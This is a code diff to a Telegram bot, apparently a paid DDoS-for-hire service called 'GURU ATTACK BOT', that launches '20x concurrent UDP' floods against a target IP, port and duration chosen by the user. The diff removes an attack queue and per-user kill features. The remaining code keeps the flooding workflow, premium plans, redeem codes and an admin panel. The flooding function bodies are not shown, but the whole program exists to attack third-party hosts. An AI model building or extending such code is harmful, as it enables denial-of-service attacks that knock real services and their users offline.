@@ -1,4 +1,4 @@
-# app.py - Working Attack + All Features (Premium, Owner Panel, Queue, Kill Switch)
+# app.py - Complete Working with All Features
 import os
 import logging
 import asyncio
@@ -34,7 +34,6 @@ OWNER_ID = int(os.getenv("OWNER_ID", "123456789"))
 PSEUDO_OWNER_ID = int(os.getenv("PSEUDO_OWNER_ID", "987654321"))
 PORT = int(os.getenv("PORT", 8080))
 MAX_CONCURRENT = 20
-MAX_QUEUE = 50
 
 logging.basicConfig(
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
@@ -431,60 +430,6 @@ class AttackManager:
 
 attack_manager = AttackManager()
 
-# ===== QUEUE SYSTEM =====
-class AttackQueue:
-    def __init__(self):
-        self.queue = []
-        self.lock = threading.Lock()
-    
-    def add_to_queue(self, user_id, target, port, duration):
-        with self.lock:
-            if len(self.queue) >= MAX_QUEUE:
-                return False, f"❌ Queue is full ({MAX_QUEUE} max)"
-            
-            user_in_queue = sum(1 for q in self.queue if q['user_id'] == user_id)
-            if user_in_queue >= MAX_CONCURRENT:
-                return False, f"❌ You already have {user_in_queue} attacks in queue"
-            
-            queue_entry = {
-                'user_id': user_id,
-                'target': target,
-                'port': port,
-                'duration': duration,
-                'added_at': datetime.now(),
-                'position': len(self.queue) + 1
-            }
-            self.queue.append(queue_entry)
-            return True, queue_entry
-    
-    def get_queue_position(self, user_id):
-        with self.lock:
-            positions = []
-            for i, q in enumerate(self.queue, 1):
-                if q['user_id'] == user_id:
-                    positions.append(i)
-            return positions
-    
-    def get_queue_status(self, user_id=None):
-        with self.lock:
-            if user_id:
-                return [q for q in self.queue if q['user_id'] == user_id]
-            return self.queue
-    
-    def kill_switch(self):
-        with self.lock:
-            killed = len(self.queue)
-            self.queue = []
-            return killed
-    
-    def kill_user_attacks(self, user_id):
-        with self.lock:
-            killed = 0
-            self.queue = [q for q in self.queue if q['user_id'] != user_id]
-            return killed
-
-attack_queue = AttackQueue()
-
 # ===== DIRECT UDP ATTACK =====
 def send_udp_direct(target, port, duration, attack_num):
     try:
@@ -667,46 +612,11 @@ async def send_20_concurrent_attacks(target, port, duration):
         "duration": duration
     }
 
-# ===== PROCESS QUEUE =====
-async def process_queue():
-    while True:
-        queue = attack_queue.get_queue_status()
-        if queue:
-            for entry in queue:
-                can_start, _ = attack_manager.can_start_attack(entry['user_id'])
-                if can_start:
-                    with attack_queue.lock:
-                        if entry in attack_queue.queue:
-                            attack_queue.queue.remove(entry)
-                    
-                    user_id = entry['user_id']
-                    target = entry['target']
-                    port = entry['port']
-                    duration = entry['duration']
-                    
-                    attack_manager.start_attack(user_id, target, port, duration, "udp", 0)
-                    result = await send_20_concurrent_attacks(target, port, duration)
-                    
-                    attack_manager.log_attack(
-                        user_id, target, port, duration, "udp",
-                        "success" if result.get('success') else "failed",
-                        str(result)
-                    )
-                    
-                    if attack_manager.active_attacks:
-                        attack_id = list(attack_manager.active_attacks.keys())[-1]
-                        attack_manager.stop_attack(attack_id)
-                    attack_manager.cleanup()
-                    
-                    await asyncio.sleep(1)
-        await asyncio.sleep(2)
-
 # ===== BOT HANDLERS =====
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     db.add_user(user.id, user.username, user.first_name)
     
-    stats = attack_manager.get_stats()
     total_attacks = db.get_user_stats(user.id)
     is_admin = db.is_admin(user.id)
     
@@ -716,16 +626,11 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         days_left = max(0, (expiry - datetime.now()).days)
         plan_display += f" ({days_left}d left)"
     
-    queue_count = len(attack_queue.get_queue_status(user.id))
-    active_count = len(attack_manager.get_active_attacks(user.id))
-    
     first_name = user.first_name or "User"
     welcome_msg = (
         f"👋 *WELCOME TO GURU*\n\n"
         f"Hello {first_name}! 👋\n"
         f"📊 Total Attacks: {total_attacks}\n"
-        f"📌 Queue: {queue_count} attacks waiting\n"
-        f"⚡ Active: {active_count} attacks running\n"
         f"📊 Plan: {plan_display}\n"
         f"⚡ 20x UDP Concurrent: ENABLED\n"
         f"⚡ Status: {'✅ ACTIVE' if not db.is_banned(user.id) else '❌ BANNED'}"
@@ -734,7 +639,6 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     keyboard = []
     if not db.is_banned(user.id):
         keyboard.append([InlineKeyboardButton("💥 20x ATTACK", callback_data="attack")])
-        keyboard.append([InlineKeyboardButton("📌 MY QUEUE", callback_data="my_queue")])
         keyboard.append([InlineKeyboardButton("👤 MY PLAN", callback_data="my_plan")])
     
     if is_admin:
@@ -788,21 +692,7 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         can_start, msg = attack_manager.can_start_attack(user_id)
         if not can_start:
-            success, result = attack_queue.add_to_queue(user_id, target, port, duration)
-            if not success:
-                await update.message.reply_text(result)
-                return
-            
-            position = attack_queue.get_queue_position(user_id)
-            await update.message.reply_text(
-                f"📌 *ATTACK ADDED TO QUEUE*\n\n"
-                f"🎯 Target: `{target}`\n"
-                f"📡 Port: `{port}`\n"
-                f"⏱️ Time: `{duration}s`\n"
-                f"📌 Position: {position[0] if position else 'N/A'}\n"
-                f"📊 Queue Size: {len(attack_queue.queue)}/{MAX_QUEUE}",
-                parse_mode='Markdown'
-            )
+            await update.message.reply_text(msg)
             return
         
         status_msg = await update.message.reply_text(
@@ -903,21 +793,7 @@ async def process_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         can_start, msg = attack_manager.can_start_attack(user_id)
         if not can_start:
-            success, result = attack_queue.add_to_queue(user_id, target, port, duration)
-            if not success:
-                await update.message.reply_text(result)
-                context.user_data['awaiting_attack'] = False
-                return
-            
-            position = attack_queue.get_queue_position(user_id)
-            await update.message.reply_text(
-                f"📌 *ATTACK ADDED TO QUEUE*\n\n"
-                f"🎯 Target: `{target}`\n"
-                f"📡 Port: `{port}`\n"
-                f"⏱️ Time: `{duration}s`\n"
-                f"📌 Position: {position[0] if position else 'N/A'}",
-                parse_mode='Markdown'
-            )
+            await update.message.reply_text(msg)
             context.user_data['awaiting_attack'] = False
             return
         
@@ -956,44 +832,6 @@ async def process_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     context.user_data['awaiting_attack'] = False
 
-# ===== MY QUEUE =====
-async def my_queue_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    
-    user_id = query.from_user.id
-    queued = attack_queue.get_queue_status(user_id)
-    active = attack_manager.get_active_attacks(user_id)
-    
-    if not queued and not active:
-        await query.edit_message_text(
-            "📌 *YOUR QUEUE*\n\nNo attacks in queue or active.",
-            parse_mode='Markdown',
-            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
-        )
-        return
-    
-    text = "📌 *YOUR QUEUE & ACTIVE ATTACKS*\n\n"
-    
-    if active:
-        text += "⚡ *Active Attacks:*\n"
-        for aid, att in active.items():
-            elapsed = (datetime.now() - att['start_time']).seconds
-            remaining = max(0, att['duration'] - elapsed)
-            text += f"🔹 {att['target']}:{att['port']} - {remaining}s left\n"
-        text += "\n"
-    
-    if queued:
-        text += "📌 *Queued Attacks:*\n"
-        for i, q in enumerate(queued, 1):
-            text += f"🔸 {q['target']}:{q['port']} - {q['duration']}s (Position: {i})\n"
-    
-    await query.edit_message_text(
-        text,
-        parse_mode='Markdown',
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
-    )
-
 # ===== MY PLAN =====
 async def my_plan_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
@@ -1011,7 +849,6 @@ async def my_plan_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "📌 Features:\n"
         "• Full access\n"
         "• 20x UDP Concurrent\n"
-        "• Priority queue\n"
         "• Unlimited attacks"
     )
     
@@ -1056,7 +893,6 @@ async def stats_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     users = db.get_all_users()
     admins = db.get_admins()
     codes = db.get_codes()
-    queue_size = len(attack_queue.queue)
     active = len(attack_manager.active_attacks)
     
     stats_text = (
@@ -1065,7 +901,6 @@ async def stats_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"👑 Admins: {len(admins)}\n"
         f"💥 Total Attacks: {total_attacks}\n"
         f"🎫 Redeem Codes: {len(codes)}\n"
-        f"📌 Queue Size: {queue_size}/{MAX_QUEUE}\n"
         f"⚡ Active Attacks: {active}/{MAX_CONCURRENT}\n"
         f"⚡ 20x UDP: ENABLED\n"
         f"🌐 Status: ONLINE"
@@ -1204,14 +1039,12 @@ async def owner_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     keyboard = [
         [InlineKeyboardButton("🛑 KILL SWITCH", callback_data="owner_kill")],
-        [InlineKeyboardButton("🔪 KILL USER", callback_data="owner_kill_user")],
         [InlineKeyboardButton("👑 PROMOTE ADMIN", callback_data="owner_promote")],
         [InlineKeyboardButton("👑 DEMOTE ADMIN", callback_data="owner_demote")],
         [InlineKeyboardButton("🚫 BAN USER", callback_data="owner_ban")],
         [InlineKeyboardButton("✅ UNBAN USER", callback_data="owner_unban")],
         [InlineKeyboardButton("📊 STATS", callback_data="stats")],
         [InlineKeyboardButton("📋 LIST ADMINS", callback_data="owner_list_admins")],
-        [InlineKeyboardButton("📌 QUEUE STATUS", callback_data="owner_queue_status")],
         [InlineKeyboardButton("🔙 BACK", callback_data="back")]
     ]
     
@@ -1229,94 +1062,34 @@ async def owner_kill_switch_callback(update: Update, context: ContextTypes.DEFAU
         await query.answer("Access denied!", show_alert=True)
         return
     
-    killed = attack_queue.kill_switch()
+    # Stop all active attacks
     for aid in list(attack_manager.active_attacks.keys()):
         attack_manager.stop_attack(aid)
     
     await query.edit_message_text(
         f"🛑 *KILL SWITCH ACTIVATED*\n\n"
-        f"✅ {killed} attacks removed from queue\n"
         f"✅ All active attacks stopped\n"
         f"⚡ System cleared!",
         parse_mode='Markdown',
         reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="owner")]])
     )
 
-async def owner_kill_user_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
+# ===== KILL COMMAND =====
+async def kill_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
     
-    if not db.is_owner_or_pseudo(query.from_user.id):
-        await query.answer("Access denied!", show_alert=True)
+    if not db.is_owner_or_pseudo(user_id):
+        await update.message.reply_text("❌ Only Owner/Pseudo Owner can use this command!")
         return
     
-    await query.edit_message_text(
-        "🔪 *KILL USER ATTACKS*\n\n"
-        "Send user ID to kill all their attacks:\n"
-        "`123456789`\n\n"
-        "Send /cancel to cancel",
+    for aid in list(attack_manager.active_attacks.keys()):
+        attack_manager.stop_attack(aid)
+    
+    await update.message.reply_text(
+        f"🛑 *KILL SWITCH ACTIVATED*\n\n"
+        f"✅ All active attacks stopped\n"
+        f"⚡ System cleared!",
         parse_mode='Markdown'
-    )
-    context.user_data['awaiting_kill_user'] = True
-
-async def process_kill_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not context.user_data.get('awaiting_kill_user'):
-        return
-    
-    if update.message.text.lower() == '/cancel':
-        context.user_data['awaiting_kill_user'] = False
-        await update.message.reply_text("Cancelled.")
-        return
-    
-    try:
-        user_id = int(update.message.text.strip())
-        killed = attack_queue.kill_user_attacks(user_id)
-        
-        active = attack_manager.get_active_attacks(user_id)
-        for aid in active:
-            attack_manager.stop_attack(aid)
-        
-        await update.message.reply_text(
-            f"🔪 *USER ATTACKS KILLED*\n\n"
-            f"✅ {killed} attacks removed from queue\n"
-            f"✅ Active attacks stopped for user `{user_id}`",
-            parse_mode='Markdown'
-        )
-    except:
-        await update.message.reply_text("❌ Invalid user ID!")
-    
-    context.user_data['awaiting_kill_user'] = False
-
-async def owner_queue_status_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    
-    queue = attack_queue.get_queue_status()
-    active = attack_manager.get_active_attacks()
-    
-    text = "📌 *QUEUE & ACTIVE ATTACKS*\n\n"
-    
-    if active:
-        text += "⚡ *Active Attacks:*\n"
-        for aid, att in active.items():
-            elapsed = (datetime.now() - att['start_time']).seconds
-            remaining = max(0, att['duration'] - elapsed)
-            text += f"🔹 {att['target']}:{att['port']} - {remaining}s left (User: {att['user_id']})\n"
-        text += "\n"
-    else:
-        text += "⚡ No active attacks\n\n"
-    
-    if queue:
-        text += "📌 *Queued Attacks:*\n"
-        for i, q in enumerate(queue, 1):
-            text += f"🔸 {q['target']}:{q['port']} - {q['duration']}s (User: {q['user_id']})\n"
-    else:
-        text += "📌 Queue is empty"
-    
-    await query.edit_message_text(
-        text[:4000],
-        parse_mode='Markdown',
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="owner")]])
     )
 
 async def owner_promote_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -1459,26 +1232,6 @@ async def owner_list_admins_callback(update: Update, context: ContextTypes.DEFAU
         reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="owner")]])
     )
 
-# ===== KILL COMMAND =====
-async def kill_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    
-    if not db.is_owner_or_pseudo(user_id):
-        await update.message.reply_text("❌ Only Owner/Pseudo Owner can use this command!")
-        return
-    
-    killed = attack_queue.kill_switch()
-    for aid in list(attack_manager.active_attacks.keys()):
-        attack_manager.stop_attack(aid)
-    
-    await update.message.reply_text(
-        f"🛑 *KILL SWITCH ACTIVATED*\n\n"
-        f"✅ {killed} attacks removed from queue\n"
-        f"✅ All active attacks stopped\n"
-        f"⚡ System cleared!",
-        parse_mode='Markdown'
-    )
-
 # ===== REDEEM COMMAND =====
 async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
@@ -1549,7 +1302,6 @@ async def back_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     keyboard = []
     if not db.is_banned(user_id):
         keyboard.append([InlineKeyboardButton("💥 20x ATTACK", callback_data="attack")])
-        keyboard.append([InlineKeyboardButton("📌 MY QUEUE", callback_data="my_queue")])
         keyboard.append([InlineKeyboardButton("👤 MY PLAN", callback_data="my_plan")])
     
     if is_admin:
@@ -1580,8 +1332,6 @@ def run_bot():
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
     
-    loop.create_task(process_queue())
-    
     app = Application.builder().token(TELEGRAM_TOKEN).build()
     application = app
     
@@ -1595,7 +1345,6 @@ def run_bot():
     
     # Callbacks - Main
     app.add_handler(CallbackQueryHandler(attack_callback, pattern="^attack$"))
-    app.add_handler(CallbackQueryHandler(my_queue_callback, pattern="^my_queue$"))
     app.add_handler(CallbackQueryHandler(my_plan_callback, pattern="^my_plan$"))
     app.add_handler(CallbackQueryHandler(info_callback, pattern="^info$"))
     app.add_handler(CallbackQueryHandler(stats_callback, pattern="^stats$"))
@@ -1612,8 +1361,6 @@ def run_bot():
     # Owner
     app.add_handler(CallbackQueryHandler(owner_callback, pattern="^owner$"))
     app.add_handler(CallbackQueryHandler(owner_kill_switch_callback, pattern="^owner_kill$"))
-    app.add_handler(CallbackQueryHandler(owner_kill_user_callback, pattern="^owner_kill_user$"))
-    app.add_handler(CallbackQueryHandler(owner_queue_status_callback, pattern="^owner_queue_status$"))
     app.add_handler(CallbackQueryHandler(owner_promote_callback, pattern="^owner_promote$"))
     app.add_handler(CallbackQueryHandler(owner_demote_callback, pattern="^owner_demote$"))
     app.add_handler(CallbackQueryHandler(owner_ban_callback, pattern="^owner_ban$"))
@@ -1626,7 +1373,6 @@ def run_bot():
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, process_promote))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, process_ban))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, process_unban))
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, process_kill_user))
     
     loop.run_until_complete(app.initialize())
     loop.run_until_complete(app.start())
@@ -1640,7 +1386,7 @@ if __name__ == "__main__":
     print("👑 GURU ATTACK BOT")
     print("⚡ 20x UDP CONCURRENT")
     print("💎 PREMIUM ONLY")
-    print("📌 Queue + Kill Switch + Admin Panel")
+    print("📌 Admin + Owner Panel")
     print("=" * 50)
     
     bot_thread = threading.Thread(target=run_bot, daemon=True)
